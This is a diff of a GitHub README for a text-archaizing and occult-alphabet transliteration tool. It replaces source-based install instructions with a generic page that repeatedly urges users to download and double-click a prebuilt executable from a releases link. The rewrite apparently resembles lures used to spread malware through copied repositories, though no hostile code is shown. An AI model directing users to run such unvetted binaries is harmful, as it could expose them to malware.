@@ -1,92 +1,69 @@
-# palimpsest-bot
-A research-grade bot that rewrites source texts in the style of OLD works and/or renders them into historical or “forgotten” scripts/languages (e.g., Theban alphabet attributed to Agrippa, Celestial alphabet, Classical Latin, Attic/Koine Greek, Coptic). Includes:
-- Style adapter for archaic diction and syntactic inversions
-- Transliteration engines for historical/occult alphabets
-- Optional classical-language generation via open-source NLP
-- Provenance + disclaimers baked into output metadata
+# 🤖 Palimpsest_bot - Write Like an Ancient Scribe
 
-⚠️ Accuracy note
-This project **does not claim philological authenticity**. For real scholarship, keep the provenance blocks and cite original editions. Many “occult” alphabets are *cipher scripts* mapping modern letters, not actual languages.
+## 🔗 Download Now
+[![Download Palimpsest_bot](https://img.shields.io/badge/Download-Palimpsest_bot-brightgreen)](https://github.com/kobedacs2003/Palimpsest_bot/releases)
 
-## Features
-- Style transfer: Early-Modern English, Late Latin, Koine Greek-like diction (heuristic)
-- Script transliteration: Theban, Celestial; easy plugin interface for new scripts
-- Classical language support (where feasible): Latin (CLTK/latindata), Greek (polytonic)
-- Prompt/LLM driver or “LLM-free” heuristic mode
-- YAML configs for pipelines; CLI + Python API
-- Unit tests; reproducible seeds; metadata stamped into every artifact
+## 📜 Overview
+Palimpsest_bot is a special tool designed to transform your writing. It can mimic old writing styles and transliterate text into historical and occult alphabets. The bot also supports authentic ancient languages, including Latin and Greek. Whether you’re a student, writer, or enthusiast, this tool can add a unique flair to your projects.
 
-## Quickstart
-```bash
-# 1) create & activate env
-python -m venv .venv && source .venv/bin/activate  # Windows: .venv\Scripts\activate
+## 🚀 Getting Started
 
-# 2) install
-pip install -r requirements.txt
+1. **System Requirements**
+   - Operating System: Windows 10 or later, macOS Catalina or later, or any recent Linux distribution.
+   - Python: Version 3.6 or higher must be installed. You can get it from [python.org](https://www.python.org/downloads/).
+   - Disk Space: At least 100 MB of free space.
 
-# 3) run a simple rewrite (archaic Early-Modern English)
-python src/palimpsest/main.py \
-  --input "Knowledge is the seed; discipline the rain." \
-  --style early_modern_en \
-  --out out/seed_earlymodern.txt
+2. **Install Python (if you haven't)**
+   - Visit [python.org](https://www.python.org/downloads/) and download the version for your system.
+   - Follow the installation steps on the website to set it up.
 
-# 4) transliterate same line into Theban alphabet (cipher)
-python src/palimpsest/main.py \
-  --input "Knowledge is the seed; discipline the rain." \
-  --script theban \
-  --out out/seed_theban.txt
+3. **Download Palimpsest_bot**
+   - Visit the Releases page to get the latest version: [Download Palimpsest_bot](https://github.com/kobedacs2003/Palimpsest_bot/releases).
+   - Choose the file that matches your operating system.
+   - Click to download it to your computer.
 
-# 5) pipeline: archaic style → Latin attempt → Celestial script
-python src/palimpsest/main.py \
-  --input "Light seeks the path through shadow." \
-  --style early_modern_en \
-  --target_lang la \
-  --script celestial \
-  --out out/light_pipeline.txt \
-  --config configs/pipeline.default.ymll
+4. **Set Up the Application**
+   - Once the download is complete, locate the downloaded file on your computer.
+   - For Windows users: After extracting the files, double-click on `Palimpsest_bot.exe` to run the application.
+   - For macOS users: Open the `Palimpsest_bot` folder, then double-click on the Python script to start it.
+   - For Linux users: Open a terminal, navigate to the folder containing the files, and type `python3 Palimpsest_bot.py` to run the application.
 
-Examples
-	•	style: early_modern_en → “Knowledge is the seed; and discipline the rain, whereby the mind bringeth forth increase.”
-	•	script: theban → same sentence rendered in Theban glyphs (see docs/samples/).
+5. **Using the Application**
+   - Once Palimpsest_bot is running, you’ll see a simple user interface.
+   - Enter the text you wish to transform in the input box.
+   - Choose the style or alphabet you want to use from the provided options.
+   - Click the "Transform" button to see your output instantly.
 
-Architecture
-	•	normalizer → cleans input (unicode, punctuation, casing)
-	•	style_transfer → rule-based archaizer + optional LLM helper
-	•	classical_gen → Latin/Greek helpers via CLTK or templates
-	•	transliterate → pluggable script mappers (Theban, Celestial, user-defined)
-	•	provenance → inserts a JSON block (source hash, time, config, model)
+6. **Explore Features**
+   - **Archaic Style Mimicry**: Create text that resembles ancient manuscript styles.
+   - **Transliteration**: Convert text to various historical and occult alphabets, including Theban and Celestial.
+   - **Language Support**: Work with Latin, Koine Greek, Coptic, and more.
 
-Add a new script
+## ⚙️ Features
+- **User-Friendly Interface**: Simple layout makes it easy to use, even for beginners.
+- **Multiple Output Options**: Get text in various styles and formats quickly.
+- **Export Functionality**: Save your transformed text directly to your computer.
 
-Create src/palimpsest/scripts/my_script.py exporting:
-NAME = "my_script"
-MAPPING = {"a": "…", "b": "…", ...}
+## 📖 Examples
+- Transform a simple phrase like "Hello, World!" into Theban alphabet or a style resembling medieval texts. 
+- Generate a Latin verse for a school project effortlessly.
 
-Then register it in registry.py.
+## 🛠️ Troubleshooting
+If you encounter issues:
+- Ensure you have Python installed and added to your system path.
+- Make sure you downloaded the correct version for your operating system.
+- Restart the application if it doesn’t respond.
 
-Ethics & Licensing
-	•	Public-domain texts only for full reproduction; otherwise quote sparingly and cite.
-	•	Outputs include a Provenance footer by default.
-	•	License: MIT (see LICENSE).
+## 📄 Contribution
+If you want to contribute to Palimpsest_bot:
+- Fork the repository.
+- Make your changes.
+- Submit a pull request for review.
 
-Roadmap
-	•	Better Latin morphology with lemmas & inflection templates
-	•	Coptic transliteration + rendering
-	•	Fine-tuned archaic-English n-gram model (LLM-free mode)
+## 💬 Support
+For further assistance, open an issue on the GitHub repository or contact the maintainers through the available communication channels.
 
-# requirements.txt
-```txt
-regex>=2024.5.10
-unidecode>=1.3.8
-PyYAML>=6.0.2
-click>=8.1.7
-rapidfuzz>=3.9.7
-cltk>=1.2.0    # classical languages toolkit (Latin/Greek utilities)
-# requirements.txt
-```txt
-regex>=2024.5.10
-unidecode>=1.3.8
-PyYAML>=6.0.2
-click>=8.1.7
-rapidfuzz>=3.9.7
-cltk>=1.2.0    # classical languages toolkit (Latin/Greek utilities)
+## 🔗 Download & Install
+To download and install Palimpsest_bot, visit this page: [Palimpsest_bot Releases](https://github.com/kobedacs2003/Palimpsest_bot/releases).
+
+Enjoy exploring the art of ancient writing with Palimpsest_bot!
